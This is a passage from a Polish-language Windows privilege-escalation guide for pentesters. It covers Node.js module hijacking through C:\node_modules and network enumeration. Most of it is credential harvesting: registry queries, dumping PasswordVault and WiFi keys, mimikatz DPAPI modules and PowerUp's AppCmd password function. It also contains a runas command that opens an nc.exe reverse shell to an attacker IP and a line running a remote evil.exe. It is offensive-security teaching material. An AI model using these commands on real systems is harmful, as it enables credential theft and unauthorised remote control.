for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Więcej informacji o tym, jak nadużyć tej kontroli:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Przejęcie rozwiązywania modułów Node.js / Electron przez `C:\node_modules`

Jest to wariant **niekontrolowanej ścieżki wyszukiwania w Windows**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują import bez ścieżki, taki jak `require("foo")`, a oczekiwany moduł **nie istnieje**.<sup>[[20]](#references)</sup>

Node wyszukuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W Windows wyszukiwanie może dotrzeć do katalogu głównego dysku, więc aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może sprawdzać kolejno:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **użytkownik o niskich uprawnieniach** może utworzyć `C:\node_modules`, może umieścić w nim złośliwy plik `foo.js` (lub folder pakietu) i poczekać, aż **proces Node/Electron o wyższych uprawnieniach** spróbuje rozwiązać brakującą zależność. Payload zostanie wykonany w kontekście bezpieczeństwa procesu ofiary, co oznacza **LPE**, jeśli proces docelowy działa jako administrator, w ramach podwyższonego zadania zaplanowanego lub opakowującej go usługi albo jako automatycznie uruchamiana aplikacja desktopowa z podwyższonymi uprawnieniami.

Zdarza się to szczególnie często, gdy:

- zależność jest zadeklarowana w `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka innej firmy opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po błędzie
- pakiet usunięto z kompilacji produkcyjnych, pominięto podczas pakowania lub nie udało się go zainstalować
- podatny `require()` znajduje się głęboko w drzewie zależności, a nie w głównym kodzie aplikacji

### Wyszukiwanie podatnych celów

Użyj **Procmon**, aby potwierdzić ścieżkę rozwiązywania modułów:<sup>[[23]](#references)</sup>

- Ustaw filtr `Process Name` = plik wykonywalny procesu docelowego (`node.exe`, plik EXE aplikacji Electron lub proces opakowujący)
- Ustaw filtr `Path` `contains` `node_modules`
- Skup się na zdarzeniach `NAME NOT FOUND` i ostatnim pomyślnym otwarciu w `C:\node_modules`

Przydatne wzorce do wyszukania podczas przeglądu kodu w rozpakowanych plikach `.asar` lub kodzie źródłowym aplikacji:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Zidentyfikuj **brakującą nazwę pakietu** na podstawie Procmon lub analizy kodu źródłowego.
2. Utwórz główny katalog wyszukiwania, jeśli jeszcze nie istnieje:

```powershell
mkdir C:\node_modules
```

3. Umieść moduł pod dokładnie oczekiwaną nazwą:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Uruchom aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a legalny moduł nie będzie dostępny, Node może załadować `C:\node_modules\foo.js`.

Rzeczywiste przykłady brakujących modułów opcjonalnych pasujących do tego wzorca to `bluebird` i `utf-8-validate`, ale **technika** jest uniwersalna: znajdź dowolny **brakujący import bez ścieżki**, który uprzywilejowany proces Windows Node/Electron spróbuje rozwiązać.

### Pomysły na wykrywanie i wzmacnianie zabezpieczeń

- Generuj alerty, gdy użytkownik utworzy `C:\node_modules` lub zapisze w nim nowe pliki `.js` albo pakiety.
- Wyszukuj procesy o wysokim poziomie integralności odczytujące dane z `C:\node_modules\*`.
- W środowisku produkcyjnym pakuj wszystkie zależności runtime i kontroluj użycie `optionalDependencies`.
- Sprawdzaj kod stron trzecich pod kątem wzorców `try { require("...") } catch {}`, które ignorują błędy.
- Wyłączaj opcjonalne sprawdzanie, jeśli biblioteka na to pozwala (na przykład niektóre wdrożenia `ws` mogą pominąć starsze sprawdzanie `utf-8-validate`, ustawiając `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udziały

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### plik hosts

Sprawdź, czy w pliku hosts na sztywno wpisano inne znane komputery.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfejsy sieciowe i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otwarte porty

Sprawdź z zewnątrz **usługi z ograniczonym dostępem**

```bash
netstat -ano #Opened ports?
```

W przypadku lokalnego listenera skoreluj jego PID z właścicielem procesu, ścieżką do pliku wykonywalnego oraz usługą lub zaplanowanym zadaniem, które go uruchamia. Usługa zdalnego sterowania może zapewnić dostęp jako jej użytkownik pulpitu tylko wtedy, gdy pozwalają na to mechanizmy uwierzytelniania i kontroli poleceń. Niestandardowa aplikacja TCP działająca na koncie o wyższych uprawnieniach wymaga osobnej analizy: listener i ścieżka do pliku binarnego to jedynie pasywne wskazówki, natomiast uwierzytelniona ścieżka wykorzystująca uszkodzenie pamięci wymaga analizy tego konkretnego pliku binarnego i dostępnego w nim punktu wejścia. Jeśli wystawiony port wydaje się należeć do procesu systemowego, porównaj go z wynikiem polecenia [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), zanim przypiszesz go do usługi backendowej; sama reguła przekierowania nie dowodzi, że miejsce docelowe jest osiągalne ani podatne na ataki.

### Tabela routingu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reguły zapory

[**Sprawdź tę stronę, aby poznać polecenia związane z zaporą**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej[ poleceń do enumeracji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Plik binarny `bash.exe` można znaleźć również w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszym użyciu `nc.exe` do nasłuchiwania na porcie pojawi się graficzny monit z pytaniem, czy zezwolić programowi `nc` na komunikację przez firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Aby łatwo uruchomić bash jako root, możesz użyć `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Uprawnienia `root` w `WSL` same w sobie nie nadają uprawnień administratora systemu Windows. Jeśli bieżąca tożsamość systemu Windows może odczytać system plików dystrybucji, sprawdź pliki historii powłoki (w tym `/root/.bash_history`) pod kątem poleceń, które mogły zapisać poświadczenia; eskalacja nadal wymaga prawidłowego konta o wyższych uprawnieniach i dozwolonej metody uwierzytelniania. Układ `LocalState\rootfs` dotyczy starszych instalacji WSL; WSL 2 zwykle przechowuje dystrybucję na wirtualnym dysku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), dlatego najpierw ustal właściwą dystrybucję i ścieżkę przechowywania. Unikaj wyświetlania zawartości historii podczas automatycznego przeszukiwania.

## Poświadczenia systemu Windows

### Poświadczenia Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traktuj `DefaultUserName` i `DefaultDomainName` jako kontekst konta, a nie dane uwierzytelniające. Niepusta wartość `DefaultPassword` lub `AltDefaultPassword` oznacza znalezienie jawnego tekstu w rejestrze. Jeśli `AutoAdminLogon=1`, ale nie można odczytać hasła w postaci jawnego tekstu, jest to tylko wskazówka: [Sysinternals Autologon może przechowywać hasło jako LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a zwykły odczyt rejestru nie pozwala ustalić, czy taki sekret istnieje ani czy można go odzyskać. Przed zgłoszeniem ujawnienia danych uwierzytelniających sprawdź prawa dostępu i rzeczywistą konfigurację logowania.

### Menedżer poświadczeń / Windows Vault

Z [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault przechowuje poświadczenia użytkowników dla serwerów, witryn internetowych i innych programów, których **Windows** może używać do **automatycznego logowania użytkowników**. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać poświadczenia do witryn takich jak Facebook, Twitter czy Gmail, aby przeglądarki logowały ich automatycznie, ale tak to nie działa.

Windows Vault przechowuje poświadczenia, za pomocą których Windows może automatycznie logować użytkowników. Oznacza to, że każda **aplikacja systemu Windows, która potrzebuje poświadczeń, aby uzyskać dostęp do zasobu** (serwera lub witryny internetowej), **może korzystać z tego Credential Manager** i Windows Vault oraz używać podanych poświadczeń zamiast za każdym razem prosić użytkowników o podanie nazwy użytkownika i hasła.

O ile aplikacje nie współpracują z Credential Manager, nie sądzę, by mogły korzystać z poświadczeń dla danego zasobu. Jeśli więc aplikacja chce korzystać z magazynu, powinna w jakiś sposób **komunikować się z menedżerem poświadczeń i zażądać poświadczeń dla tego zasobu** z domyślnego magazynu.

Użyj `cmdkey`, aby wyświetlić zapisane poświadczenia na komputerze.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Następnie możesz użyć `runas` z opcją `/savecred`, aby skorzystać z zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik binarny za pośrednictwem udziału SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Używanie `runas` z podanym zestawem danych uwierzytelniających.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Zwróć uwagę na mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub moduł [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje UWP systemu Windows, Microsoft Edge i nowoczesne usługi systemowe przechowują tokeny uwierzytelniające oraz hasła w postaci jawnej w `PasswordVault` platformy Universal Windows Platform (UWP) (dostępnym również jako `Web Credentials` w `vaultcmd`). Ten obszar magazynu jest odizolowany dla każdej sesji i można go odszyfrować natywnie bez uprawnień administratora ani `SeDebugPrivilege`.

Wykonaj to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie zapisane nazwy użytkowników oraz hasła w postaci jawnej:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** zapewnia metodę symetrycznego szyfrowania danych, używaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, który znacząco zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzanego z danych uwierzytelniających użytkownika używanych podczas logowania**. W przypadku szyfrowania systemowego wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkowników, szyfrowane za pomocą DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [identyfikator zabezpieczeń](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, przechowywany razem z kluczem głównym zabezpieczającym klucze prywatne użytkownika w tym samym pliku**, zazwyczaj składa się z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wyświetlenie jego zawartości za pomocą polecenia `dir` w CMD, ale można ją wyświetlić w PowerShellu).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Możesz użyć **modułu mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby je odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zwykle znajdują się w:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane do **skryptów** i zadań automatyzacji jako wygodny sposób przechowywania zaszyfrowanych danych uwierzytelniających. Są one chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że można je odszyfrować tylko na tym samym komputerze i przez tego samego użytkownika, który je utworzył.

Wyeksportowane poświadczenie może mieć dowolną nazwę pliku lub ścieżkę `.xml`. Jeśli skrypt lub inwentaryzacja plików wskaże takie poświadczenie, ustal rzeczywisty katalog profilu konta, zamiast zakładać, że znajduje się w `C:\Users`: [Windows może przechowywać profile w innych lokalizacjach](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Czytelny plik to jedynie wskazówka; [funkcja `Export-Clixml` systemu Windows wiąże zaszyfrowane poświadczenie z użytkownikiem i komputerem, na których je wyeksportowano](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a każde odzyskane konto musi osobno mieć odpowiednie uprawnienia do docelowej usługi. Najpierw sprawdź ścieżki i ACL, nie wyświetlając podczas rutynowej inwentaryzacji zaszyfrowanych ani jawnych wartości.

Aby **odszyfrować** poświadczenia PS z pliku, który je zawiera, możesz wykonać:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Ostatnio uruchamiane polecenia

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menedżer poświadczeń pulpitu zdalnego**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Użyj modułu Mimikatz `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować dowolne pliki .rdg**\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z pamięci za pomocą modułu Mimikatz `sekurlsa::dpapi`

**mRemoteNG używa innego magazynu połączeń.** Sprawdź czytelne pliki XML w `%APPDATA%\mRemoteNG` i folderze Dokumenty użytkownika, w tym pliki o zwyczajnych nazwach, takich jak `config.xml`. Zidentyfikuj schemat połączeń i zaszyfrowane atrybuty `Password`, zanim uznasz plik XML za potencjalne źródło danych logowania. Zapisana wartość nie jest hasłem DPAPI/RDCMan; odzyskanie zależy od ustawień szyfrowania pliku oraz tego, czy użyto niestandardowego hasła głównego. Unikaj wyświetlania zaszyfrowanych wartości podczas szerokiego przeszukiwania.

**Eksporty profili Remote Desktop Plus** mogą być również czytelne w katalogach użytkowników lub udostępnionym folderze administracyjnym. Eksport `profiles.xml` ze starszej wersji zawiera wpisy `Data/Profile` z elementami `ProfileName`, `Password` i `Secure`. Niepusty element hasła traktuj jako trop do dalszej weryfikacji, nie wyświetlając go ani nie zakładając, że jest to tekst jawny: [producent informuje](https://www.donkz.nl/), że ochrona profilu może być powiązana z kontem i komputerem, na których profil utworzono, albo skonfigurowana mniej restrykcyjnie. Zanim oprzesz się na takim pliku, potwierdź jego pochodzenie i warunki odzyskiwania.

### Sticky Notes

Ludzie czasem zapisują hasła i inne informacje w aplikacjach z karteczkami samoprzylepnymi. Aplikacja Sticky Notes firmy Microsoft, instalowana jako pakiet, zazwyczaj przechowuje notatki w `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starsze lub inne aplikacje mogą korzystać z innych magazynów w profilu użytkownika, w tym LevelDB. Zidentyfikuj zainstalowaną aplikację i format przechowywania, zanim uznasz brak pliku SQLite za brak notatek.

Jeśli Sticky Notes korzysta z logowania z wyprzedzającym zapisem SQLite (WAL), sama kopia `plum.sqlite` może nie zawierać ostatnio zatwierdzonych notatek. Zachowaj pasujący plik `plum.sqlite-wal` wraz ze spójną kopią bazy danych i dołącz `plum.sqlite-shm`, jeśli jest dostępny; indeks w pamięci współdzielonej można odbudować, ale WAL stanowi część trwałego stanu bazy danych. Zobacz [dokumentację WAL SQLite](https://www.sqlite.org/wal.html). Notatkę zawierającą nazwę konta lub hasło traktuj jedynie jako trop do dalszej weryfikacji: osobno sprawdź konto, dozwolony dostęp i ponowne użycie hasła. Zaszyfrowany rekord menedżera haseł wymaga ponadto rzeczywistego klucza deszyfrującego i interpretacji właściwej dla danej aplikacji, zanim będzie można uznać go za dowód logowania z wyższymi uprawnieniami.

### AppCmd.exe

**Pamiętaj, że do odzyskiwania haseł z AppCmd.exe musisz być Administratorem i uruchomić go z poziomem wysokiej integralności.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano i można **odzyskać** pewne **dane logowania**.

Ten kod pochodzi z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Sprawdź, czy istnieje `C:\Windows\CCM\SCClient.exe`.\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (Informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Pliki i rejestr (dane uwierzytelniające)

### Artefakty danych uwierzytelniających narzędzi wsparcia w rejestrze

Niektóre starsze instalacje oprogramowania do zdalnego wsparcia zachowują nazwy wartości związane z hasłami w stałych kluczach rejestru aplikacji. Na przykład `SecurityPasswordAES` w TeamViewer wskazywał skonfigurowane statyczne hasło sesji w wersjach wcześniejszych niż 9, zgodnie z [wyjaśnieniem producenta dotyczącym klucza rejestru](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Znacznik w postaci nazwy wartości jest jedynie wskazówką do dalszej analizy: przed oceną danego poświadczenia zweryfikuj zainstalowaną wersję, możliwość odczytu danych wartości, ich format oraz bieżące zachowanie mechanizmu uwierzytelniania. Użycie hasła do zdalnego wsparcia w celu uzyskania dostępu do bardziej uprzywilejowanego konta Windows wymaga dodatkowo faktycznego ponownego użycia hasła i uprawnień do tego konta. Nie umieszczaj tekstu zaszyfrowanego ani odzyskanych haseł w rutynowych wynikach enumeracji.

### Udostępnione arkusze z chronionymi arkuszami

Jeśli podejrzewasz, że czytelny udostępniony skoroszyt zawiera dane kont, odróżnij **szyfrowanie pliku** od ochrony arkusza lub ukrytych kolumn. [Microsoft informuje](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), że ochrona arkusza kontroluje edycję i nie jest funkcją zabezpieczającą; sama w sobie nie potwierdza, że zawartość skoroszytu jest zaszyfrowana. Analizuj wyłącznie autoryzowane, istotne pliki i unikaj wyświetlania potencjalnych sekretów podczas szerokiej enumeracji. Sama dostępna ścieżka do pliku `.xlsx`, chroniony arkusz lub ukryta kolumna nie dowodzą, że istnieją tam dane uwierzytelniające ani że którekolwiek konto ma wyższe uprawnienia; osobno zweryfikuj rzeczywiste dane i bieżące uprawnienia konta.

### Zachowane poprawki zmian na serwerze CI

Serwer CI może zachowywać przesłane zmiany w kodzie źródłowym w swoim katalogu danych nawet po zakończeniu kompilacji. [TeamCity opisuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` jako miejsce przechowywania zmian zdalnych uruchomień; katalog danych można skonfigurować i nie musi on znajdować się w `ProgramData`. Czytelna poprawka może zachować usunięte lub dodane odwołania do pliku poświadczeń, klucza szyfrowania albo skryptu korzystającego z obu tych elementów. Na przykład przepływ pracy PowerShell `ConvertTo-SecureString -Key` wymaga zarówno klucza AES, jak i zaszyfrowanego ciągu; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), że klucz jest przekazywany osobno. Najpierw sprawdź wyłącznie dostępne nazwy poprawek, a następnie, za odpowiednim upoważnieniem, przeanalizuj istotną zawartość bez wyświetlania sekretów w rutynowych wynikach enumeracji. Sama ścieżka poprawki, zaszyfrowana wartość lub odwołanie do klucza nie dowodzą, że istnieje ważne poświadczenie ani dostęp na wyższym poziomie uprawnień. Ogranicz ACL katalogu danych i nie umieszczaj sekretów w zmianach kompilacji.

### Niestandardowa rotacja haseł lokalnego administratora

Autorski mechanizm rotacji haseł może przechowywać zaszyfrowane hasło lokalnego administratora w lokalnej usłudze, a dane uwierzytelniające do magazynu danych — w czytelnym pliku `.env` lub obok pliku binarnego aktualizatora. Analizuj łącznie zaplanowane zadanie aktualizatora, konto, ACL konfiguracji, nasłuchujący interfejs i uprawnienia do magazynu danych. Dostęp do magazynu danych ograniczony do loopback jest nadal możliwy z poziomu lokalnego użytkownika posiadającego prawidłowe dane uwierzytelniające, ale samo uwierzytelnienie nie dowodzi uprawnień do odczytu odpowiednich rekordów. Jeśli ziarno szyfrowania lub materiał klucza jest dostępny obok tekstu zaszyfrowanego, przed uznaniem szyfrowania za wiarygodne sprawdź dokładny sposób wyprowadzania klucza. Schemat deterministycznie wyprowadzający klucz AES z ujawnionego ziarna za pomocą Go [`math/rand`](https://pkg.go.dev/math/rand) nie nadaje się do ochrony tego hasła; dokumentacja Go wskazuje, że ten pakiet nie jest odpowiedni do losowości istotnej z punktu widzenia bezpieczeństwa. Zanim uznasz odzyskane hasło za ścieżkę eskalacji uprawnień, potwierdź, że jest aktualne i należy do konta należącego do lokalnej grupy Administrators. Samo zaplanowane zadanie, ścieżka `.env` ani zaszyfrowany obiekt binarny nie dowodzą żadnego z tych warunków. Nie umieszczaj haseł ani materiału klucza w rutynowych wynikach enumeracji.

Do zarządzania hasłami lokalnego administratora używaj [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Przechowywanie w katalogu lub w Entra oraz mechanizmy kontroli dostępu różnią się od niestandardowego lokalnego magazynu danych; podobnie [role Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) określają, czy uwierzytelniony użytkownik magazynu danych może odczytać konkretny indeks.

### Archiwa wtyczek serwera Java i ponowne użycie poświadczeń

Niektóre wtyczki serwerów Java są dystrybuowane jako archiwa JAR w katalogu `plugins` serwera. Czytelna, niestandardowa wtyczka może zawierać konfigurację lub bytecode z osadzonymi danymi uwierzytelniającymi usługi. Analizuj archiwum wyłącznie za upoważnieniem i nie umieszczaj odzyskanych sekretów w rutynowych wynikach enumeracji. Sama ścieżka wtyczki nie dowodzi, że istnieje w niej sekret, a odzyskane hasło usługi prowadzi do wyższych uprawnień tylko wtedy, gdy jest również ważne dla bardziej uprzywilejowanego konta. Sprawdź odpowiednie ACL plików i zastąp ponownie używane poświadczenia unikatowymi sekretami. Informacje o układzie katalogów znajdziesz w [przewodniku instalacji wtyczek PaperMC](https://docs.papermc.io/paper/adding-plugins/), a o zawartości archiwów — w [dokumentacji JAR firmy Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Poświadczenia w osadzonej bazie danych Openfire

Instalacja Openfire korzystająca z osadzonej bazy danych może przechowywać `openfire.script` w `Openfire\embedded-db`. Jeśli bieżące konto może odczytać ten plik, przeanalizuj jednocześnie rekordy `OFUSER` i właściwość `passwordKey`. [Dokumentacja dostawcy użytkowników](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) Openfire informuje, że hasła mogą być przechowywane w postaci jawnej lub szyfrowane kluczem przechowywanym w tej właściwości. Odzyskane hasło ma znaczenie dla eskalacji tylko wtedy, gdy nadal jest ważne dla bardziej uprzywilejowanej tożsamości; sama nazwa pliku nie dowodzi ani dostępu do odczytu, ani ponownego użycia poświadczeń. Ścieżka jest wskazówką inwentaryzacyjną, więc nie umieszczaj zawartości bazy danych ani danych uwierzytelniających w rutynowych wynikach enumeracji.

